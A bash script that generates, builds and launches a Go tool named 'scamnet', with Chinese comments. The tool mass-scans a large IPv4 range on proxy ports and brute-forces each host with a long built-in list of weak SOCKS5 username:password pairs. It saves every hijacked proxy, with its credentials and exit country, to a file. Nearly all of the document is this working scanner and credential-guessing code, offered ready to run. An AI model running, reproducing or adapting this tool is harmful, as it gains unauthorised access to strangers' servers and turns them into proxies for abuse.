#!/bin/bash
# scamnet Go 内核终极修复版 - 兼容旧 Go (1.17-) + 新特性
set -euo pipefail
IFS=$'\n\t'

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

LOG_DIR="logs"
mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"

log "写入终极兼容 Go 内核 → scamnet.go"

cat > scamnet.go << 'EOF'
package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sync/semaphore"
)

var (
	concurrency    int64 = 300
	timeOutSeconds     = 6
	batchSize          = 10000
	validFile          = "socks5_valid.txt"
	weakPasswords      = []string{
		"admin:admin", "::", "0:0", "00:00", "000:000", "0000:0000", "00000:00000", "000000:000000",
		"1:1", "11:11", "111:111", "1111:1111", "11111:11111", "111111:111111",
		"2:2", "22:22", "222:222", "2222:2222", "22222:22222", "222222:222222",
		"3:3", "33:33", "333:333", "3333:3333", "33333:33333", "333333:333333",
		"4:4", "44:44", "444:444", "4444:4444", "44444:44444", "444444:444444",
		"5:5", "55:55", "555:555", "5555:5555", "55555:55555", "555555:555555",
		"6:6", "66:66", "666:666", "6666:6666", "66666:66666", "666666:666666",
		"7:7", "77:77", "777:777", "7777:7777", "77777:77777", "777777:777777",
		"8:8", "88:88", "888:888", "8888:8888", "88888:88888", "888888:888888",
		"9:9", "99:99", "999:999", "9999:9999", "99999:99999", "999999:999999",
		"1080:1080", "123:123", "123:321", "123:456", "123:abc", "123:qwe",
		"1234:1234", "1234:4321", "1234:5678", "1234:abcd", "1234:qwer",
		"12345:12345", "12345:54321", "12345:67890", "12345:678910", "12345:abcde", "12345:qwert",
		"123456:123456", "123456:654321", "123456:abcdef", "123456:qwerty", "123456:qwert",
		"12345678:12345678", "12345678:87654321", "123456789:123456789", "123456789:987654321",
		"123459:123459", "12349:12349", "1239:1239", "321:321", "520:520", "520:1314",
		"69:69", "6969:6969", "696969:696969", "a:a", "a:b", "aa:aa", "aaa:aaa", "aaaa:aaaa",
		"aaaaa:aaaaa", "aaaaaa:aaaaaa", "aaa:111", "aaa:123", "aaa:bbb", "a123:a123",
		"aa123:aa123", "aaa123:aaa123", "aa123456:aa123456", "a123456:a123456",
		"123aa:123aa", "123aaa:123aaa", "123abc:123abc", "ab:ab", "ab:cd", "abc:123",
		"abc:abc", "abc:cba", "abc:def", "abcdefg:abcdefg", "abc123:abc123", "abcde:abcde",
		"admin:", "admin:123", "admin:123456", "admin123:admin", "as:df", "asd:asd", "asd:fgh",
		"awsl:awsl", "b:b", "bb:bb", "bbb:bbb", "bbbb:bbbb", "bbbbb:bbbbb", "bbbbbb:bbbbbb",
		"c:c", "cc:cc", "ccc:ccc", "cccc:cccc", "ccccc:ccccc", "cccccc:cccccc", "cnmb:cnmb",
		"d:d", "dd:dd", "ddd:ddd", "dddd:dddd", "ddddd:ddddd", "dddddd:dddddd", "demo:demo",
		"e:e", "ee:ee", "eee:eee", "eeee:eeee", "eeeee:eeeee", "eeeeee:eeeeee",
		"f:f", "ff:ff", "fff:fff", "ffff:ffff", "fffff:fffff", "ffffff:ffffff", "fuckyou:fuckyou",
		"g:g", "gg:gg", "ggg:ggg", "gggg:gggg", "ggggg:ggggg", "gggggg:gggggg", "guest:guest",
		"h:h", "hh:hh", "hhh:hhh", "hhhh:hhhh", "hhhhh:hhhhh", "hhhhhh:hhhhhh", "hello:hello",
		"i:i", "ii:ii", "iii:iii", "iiii:iiii", "iiiii:iiiii", "iiiiii:iiiiii",
		"j:j", "jj:jj", "jjj:jjj", "jjjj:jjjj", "jjjjj:jjjjj", "jjjjjj:jjjjjj",
		"k:k", "kk:kk", "kkk:kkk", "kkkk:kkkk", "kkkkk:kkkkk", "kkkkkk:kkkkkk",
		"l:l", "ll:ll", "lll:lll", "llll:llll", "lllll:lllll", "llllll:llllll", "love:love",
		"m:m", "mm:mm", "mmm:mmm", "mmmm:mmmm", "mmmmm:mmmmm", "mmmmmm:mmmmmm",
		"n:n", "nn:nn", "nnn:nnn", "nnnn:nnnn", "nnnnn:nnnnn", "nnnnnn:nnnnnn", "nmsl:nmsl",
		"o:o", "oo:oo", "ooo:ooo", "oooo:oooo", "ooooo:ooooo", "oooooo:oooooo",
		"p:p", "pp:pp", "ppp:ppp", "pppp:pppp", "ppppp:ppppp", "pppppp:pppppp", "password:password",
		"proxy:proxy", "q:q", "qaq:qaq", "qaq:qwq", "qq:qq", "qqq:qqq", "qqqq:qqqq", "qqqqq:qqqqq",
		"qqqqqq:qqqqqq", "qwe:123", "qwe:asd", "qwe:qwe", "qwe123:qwe123", "qweasd:qweasd",
		"qwer:1234", "qwer:qwer", "qwert:12345", "qwert:qwert", "qwerty:123456", "qwerty:qwerty",
		"qwq:qaq", "qwq:qwe", "qwq:qwq", "r:r", "rr:rr", "rrr:rrr", "rrrr:rrrr", "rrrrr:rrrrr",
		"rrrrrr:rrrrrr", "root:root", "s:s", "s5:s5", "ss:ss", "sss:sss", "ssss:ssss", "sssss:sssss",
		"ssssss:ssssss", "socks:socks", "socks5:socks5", "t:t", "test:test", "test123:test123",
		"tt:tt", "ttt:ttt", "tttt:tttt", "ttttt:ttttt", "tttttt:tttttt", "u:u",
		"user:123", "user:1234", "user:12345", "user:123456", "user:pass", "user:password", "user:pwd",
		"user:user", "username:username", "uu:uu", "uuu:uuu", "uuuu:uuuu", "uuuuu:uuuuu", "uuuuuu:uuuuuu",
		"v:v", "vv:vv", "vvv:vvv", "vvvv:vvvv", "vvvvv:vvvvv", "vvvvvv:vvvvvv",
		"w:w", "wsnd:wsnd", "ww:ww", "www:www", "wwww:wwww", "wwwww:wwwww", "wwwwww:wwwwww",
		"x:x", "xx:xx", "xxx:xxx", "xxxx:xxxx", "xxxxx:xxxxx", "xxxxxx:xxxxxx",
		"y:y", "yy:yy", "yyy:yyy", "yyyy:yyyy", "yyyyy:yyyyy", "yyyyyy:yyyyyy",
		"z:z", "zz:zz", "zzz:zzz", "zzzz:zzzz", "zzzzz:zzzzz", "zzzzzz:zzzzzz",
	}
	countryCache sync.Map
	muValid      sync.Mutex
	validCount   int64 // atomic
	done         int64 // atomic
)

func main() {
	// 初始化
	if f, err := os.Create(validFile); err == nil {
		fmt.Fprintln(f, "# Go SOCKS5 Scanner - valid proxies (socks5://[user:pass@]ip:port#Country)")
		f.Close()
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("起始 IP (默认 47.80.0.0): ")
	startIP, _ := reader.ReadString('\n')
	startIP = strings.TrimSpace(startIP)
	if startIP == "" {
		startIP = "47.80.0.0"
	}
	if !validIP(startIP) {
		fmt.Println("[!] 无效起始 IP")
		return
	}

	fmt.Print("结束 IP (默认 47.86.255.255): ")
	endIP, _ := reader.ReadString('\n')
	endIP = strings.TrimSpace(endIP)
	if endIP == "" {
		endIP = "47.86.255.255"
	}
	if !validIP(endIP) {
		fmt.Println("[!] 无效结束 IP")
		return
	}

	startI := ipToInt(startIP)
	endI := ipToInt(endIP)
	if startI > endI {
		startIP, endIP = endIP, startIP
		startI, endI = endI, startI
	}

	fmt.Print("端口 (默认 1080,8080,8888,3128): ")
	portsStr, _ := reader.ReadString('\n')
	portsStr = strings.TrimSpace(portsStr)
	if portsStr == "" {
		portsStr = "1080,8080,8888,3128"
	}
	ports := parsePorts(portsStr)
	if len(ports) == 0 {
		fmt.Println("[!] 无效端口")
		return
	}

	ipCount := int(endI - startI + 1)
	total := uint64(ipCount) * uint64(len(ports))
	batchCount := (total + uint64(batchSize) - 1) / uint64(batchSize)

	fmt.Printf("[*] 范围: %s ~ %s (%d IP)\n", startIP, endIP, ipCount)
	fmt.Printf("[*] 端口: %v (%d)\n", ports, len(ports))
	fmt.Printf("[*] 总任务: %d | 批次: %d | 并发: %d | 超时: %ds\n", total, batchCount, concurrency, timeOutSeconds)
	fmt.Println("[*] 启动 (Ctrl+C 停止)")

	go progressBar(total)

	for b := uint64(0); b < total; b += uint64(batchSize) {
		e := b + uint64(batchSize)
		if e > total {
			e = total
		}
		fmt.Printf("\n[*] 批次 %d/%d (%d tasks)\n", b/uint64(batchSize)+1, batchCount, e-b)
		scanBatch(uint32(startI), uint32(endI), ports, b, e)
	}

	time.Sleep(2 * time.Second)
	dedup(validFile)
	fmt.Printf("\n[+] 完成！有效: %d 条 → %s\n", atomic.LoadInt64(&validCount), validFile)
}

func scanBatch(start, end uint32, ports []int, b, e uint64) {
	sem := semaphore.NewWeighted(concurrency)
	ctx := context.Background()
	var wg sync.WaitGroup
	idx := b
	for i := start; i <= end && idx < e; i++ {
		ip := intToIP(i)
		for _, p := range ports {
			if idx >= e {
				goto done
			}
			wg.Add(1)
			go func(ip string, port int) {
				defer wg.Done()
				sem.Acquire(ctx, 1)
				defer sem.Release(1)
				scanTarget(ip, port)
				atomic.AddInt64(&done, 1)
			}(ip, p)
			idx++
		}
	}
done:
	wg.Wait()
}

func scanTarget(ip string, port int) {
	if ok, lat, origin := testSocks5(ip, port, "", ""); ok {
		saveValid(ip, port, "", "", origin, lat)
		return
	}
	for _, pw := range weakPasswords {
		parts := strings.SplitN(pw, ":", 2)
		u, p := parts[0], ""
		if len(parts) > 1 {
			p = parts[1]
		}
		if ok, lat, origin := testSocks5(ip, port, u, p); ok {
			saveValid(ip, port, u, p, origin, lat)
			return
		}
	}
}

func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
	proxyURL := fmt.Sprintf("socks5://%s:%s@%s:%d", user, pass, ip, port)
	if user == "" {
		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
	}
	u, _ := url.Parse(proxyURL)
	tr := &http.Transport{Proxy: http.ProxyURL(u)}
	client := &http.Client{Transport: tr, Timeout: time.Duration(timeOutSeconds) * time.Second}
	start := time.Now()
	resp, err := client.Get("http://ifconfig.me")
	lat := int(time.Since(start).Milliseconds())
	if err != nil || resp.StatusCode != 200 {
		if resp != nil {
			resp.Body.Close()
		}
		return false, lat, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	origin := strings.TrimSpace(string(body))
	if origin == "" || lat > 6000 {
		return false, lat, ""
	}
	return true, lat, origin
}

func saveValid(ip string, port int, user, pass, origin string, lat int) {
	country := getCountry(origin)
	muValid.Lock()
	f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	auth := ""
	if user != "" {
		auth = user + ":" + pass + "@"
	}
	line := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
	fmt.Fprintln(f, line)
	f.Close()
	muValid.Unlock()
	atomic.AddInt64(&validCount, 1)
	fmt.Printf("[+] #%d %s (%dms) 出站:%s 国家:%s\n", atomic.LoadInt64(&validCount), line, lat, origin, country)
}

func getCountry(ip string) string {
	if v, ok := countryCache.Load(ip); ok {
		return v.(string)
	}
	code := "XX"
	for _, base := range []string{"http://ip-api.com/json/%s?fields=countryCode", "https://ipinfo.io/%s/country", "https://country.is/%s"} {
		url := fmt.Sprintf(base, ip)
		if resp, err := http.Get(url); err == nil && resp.StatusCode == 200 {
			if body, _ := io.ReadAll(resp.Body); resp.Body.Close(); body != nil {
				c := strings.TrimSpace(string(body))
				if regexp.MustCompile(`^[A-Z]{2}$`).MatchString(c) {
					code = c
					break
				}
			}
		}
	}
	countryCache.Store(ip, code)
	return code
}

func progressBar(total uint64) {
	for atomic.LoadInt64(&done) < int64(total) {
		cur := atomic.LoadInt64(&done)
		r := float64(cur) / float64(total)
		bar := strings.Repeat("█", int(r*50)) + strings.Repeat("░", 50-int(r*50))
		fmt.Printf("\r进度: [%s] %.1f%% (%d/%d)", bar, r*100, cur, total)
		time.Sleep(300 * time.Millisecond)
	}
	fmt.Printf("\r进度: [%s] 100.0%% (%d/%d)\n", strings.Repeat("█", 50), total, total)
}

func dedup(file string) {
	data, _ := os.ReadFile(file)
	lines := strings.Split(string(data), "\n")
	seen := make(map[string]bool)
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l != "" && !strings.HasPrefix(l, "#") {
			seen[l] = true
		}
	}
	var uniq []string
	for l := range seen {
		uniq = append(uniq, l)
	}
	sort.Strings(uniq)
	out := "# Deduped " + time.Now().Format("2006-01-02 15:04") + "\n"
	for _, l := range uniq {
		out += l + "\n"
	}
	os.WriteFile(file, []byte(out), 0644)
	fmt.Printf("[+] 去重: %d 条\n", len(uniq))
}

func validIP(s string) bool { return net.ParseIP(s) != nil }
func ipToInt(ip string) uint32 {
	p := strings.Split(ip, ".")
	a, _ := strconv.Atoi(p[0])
	b, _ := strconv.Atoi(p[1])
	c, _ := strconv.Atoi(p[2])
	d, _ := strconv.Atoi(p[3])
	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
}
func intToIP(n uint32) string { return fmt.Sprintf("%d.%d.%d.%d", n>>24, n>>16&255, n>>8&255, n&255) }
func parsePorts(s string) []int {
	var res []int
	seen := map[int]bool{}
	for _, tok := range strings.Split(s, ",") {
		tok = strings.TrimSpace(tok)
		if r := strings.Split(tok, "-"); len(r) == 2 {
			st, _ := strconv.Atoi(r[0])
			en, _ := strconv.Atoi(r[1])
			for i := st; i <= en && i <= 65535; i++ {
				if !seen[i] {
					res = append(res, i)
					seen[i] = true
				}
			}
		} else if p, err := strconv.Atoi(tok); err == nil && p > 0 && p <= 65535 && !seen[p] {
			res = append(res, p)
			seen[p] = true
		}
	}
	sort.Ints(res)
	return res
}
EOF

log "初始化模块 & 下载依赖..."
go mod init scamnet 2>/dev/null || true
go mod tidy -e >/dev/null 2>&1

log "编译 (兼容 Go 1.16+)"
if go build -ldflags="-s -w" -o scamnet scamnet.go; then
	succ "编译成功！"
else
	err "仍失败？运行: go version"
	go version || true
	exit 1
fi

> "$LATEST_LOG"

succ "启动..."
ulimit -n 999999 2>/dev/null || true
./scamnet 2>&1 | tee -a "$LATEST_LOG"

succ "完成！"
echo "cat socks5_valid.txt     # 结果"
echo "grep '\\[+]' $LATEST_LOG # 命中"
